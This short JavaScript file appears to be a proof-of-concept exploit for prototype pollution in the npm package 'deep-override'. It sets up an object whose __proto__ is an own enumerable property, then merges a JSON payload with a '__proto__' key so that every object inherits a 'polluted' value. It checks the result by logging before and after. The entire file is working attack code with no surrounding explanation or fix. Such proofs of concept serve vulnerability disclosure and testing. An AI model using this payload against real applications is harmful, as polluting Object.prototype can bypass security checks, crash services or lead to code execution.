var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const deepOverride = require('deep-override');
deepOverride(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);